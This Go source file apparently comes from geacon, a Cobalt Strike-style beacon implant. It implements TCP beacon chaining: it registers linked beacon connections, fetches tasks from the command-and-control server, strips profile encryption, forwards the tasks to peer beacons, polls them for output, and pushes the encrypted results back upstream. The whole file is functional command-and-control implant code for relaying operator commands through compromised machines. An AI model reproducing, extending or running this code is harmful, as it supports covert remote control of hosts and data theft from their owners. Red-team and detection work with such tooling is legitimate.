package packet

import (
	"fmt"
	"geacon/cmd/config"
	"net"
	"io"
	"time"
	"errors"
	"syscall"
)

func AddTcpBeaconLink(id int, conn net.Conn, reader io.Reader, encryptedMetaInfo []byte) {
	fmt.Printf("Adding beacon with ID %d to the list of connected beacons\n", id)
	config.TcpBeacons = append(config.TcpBeacons, config.TcpBeacon{id, conn, reader, encryptedMetaInfo})
}

func CheckTcpBeacons() {
	// checking all tcp beacons known and returning their output

	for _, beacon := range config.TcpBeacons {
		// checking if the beacon has any new tasks
		resp := PullChainCommand(beacon.EncryptedMetaInfo)
		// remove any encryption layer provided by our malleable profile
		taskDecrypted := ProfileDecryptPacket(resp.Bytes())
		// check if the length is greater than zero
		if len(taskDecrypted) > 0 {
			fmt.Printf("Beacon %d received tasks (length is %d), sending to beacon...\n", beacon.Id, len(taskDecrypted))
			bytesLen := WriteLittleInt(len(taskDecrypted))
			fmt.Printf("Length is [%x] in current endianness, converted will be [%x]\n", len(taskDecrypted), bytesLen)
			// send the length of bytes the beacon should expect
			beacon.Conn.Write(bytesLen)
			time.Sleep(50 * time.Millisecond)
			beacon.Conn.Write(taskDecrypted)
			fmt.Printf("Sent tasks to beacon %d\n", beacon.Id)
		}
		time.Sleep(200 * time.Millisecond)

		// now collecting any output of the beacon
		fmt.Printf("Reading data from beacon with ID %d\n", beacon.Id)
		// Sending 0x00 0x00 0x00 0x00 to query beacon to checkin, response will be 1. length of response to await (4 bytes), 2. answer
		
		beacon.Conn.Write([]byte{00, 00, 00, 00})
		time.Sleep(50 * time.Millisecond)
		// reading length of data to expect
		messageLengthByte := make([]byte, 4)
		bytesRead, err := beacon.Conn.Read(messageLengthByte)
		if err != nil {
			if errors.Is(err, syscall.ECONNRESET) {
				fmt.Printf("This is connection reset by peer error\n")
			}
			panic(err)
		}
		messageLength := ReadLittleInt(messageLengthByte)
		fmt.Printf("Read %d Bytes.\nMessage length to expect is %d [%x]\n", bytesRead, messageLength, messageLengthByte)

		if messageLength > 0 {
			beaconOutput := make([]byte, messageLength)
			// tmp := make([]byte, 256)
			// for {
			// 	n, err := reader.Read(tmp)
			// 	if err != nil {
			// 		if err != io.EOF {
			// 			fmt.Println("read error:", err)
			// 		} 
			// 		fmt.Println("DEBUG: Output finished. Breaking\n")
			// 		break
			// 	}
			// 	//fmt.Println("got", n, "bytes.")
			// 	fmt.Printf("Read %d Bytes.\nMessage is %x\n", n, tmp)
			// 	beaconOutput = append(beaconOutput, tmp[:n]...)
			// }
			n, err := beacon.Conn.Read(beaconOutput)
			if err != nil {
				fmt.Println("read error:", err)
			}
			fmt.Printf("Read %d Bytes.\nMessage is %x\n\n", n, beaconOutput)

			PushChainResult(beacon.Id, EncryptPacket(beaconOutput))

		} else {
			fmt.Printf("Beacon %d is only checking in, nothing to see here\n", beacon.Id)
		}

	}
}